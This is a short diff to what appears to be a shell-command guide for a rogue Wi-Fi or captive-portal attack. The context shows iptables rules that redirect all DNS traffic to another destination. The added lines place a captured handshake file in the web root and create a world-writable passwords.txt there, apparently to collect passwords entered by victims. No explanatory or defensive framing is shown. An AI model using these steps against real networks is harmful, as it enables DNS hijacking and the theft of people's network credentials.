@@ -37,3 +37,14 @@ iptables -t nat -A PREROUTING -i [interface] -p udp --dport 53 -j DNAT --to-dest
 iptables -A INPUT -i [interface] -j ACCEPT
 iptables -t nat -L -n -v
 ```
+
+```
+cp [output]-01.cap /var/www/html/
+chown root:www-data /var/www/html/[output]-01.cap
+chmod 640 /var/www/html/[output]-01.cap
+```
+
+```
+touch /var/www/html/passwords.txt
+chmod 666 /var/www/html/passwords.txt
+```
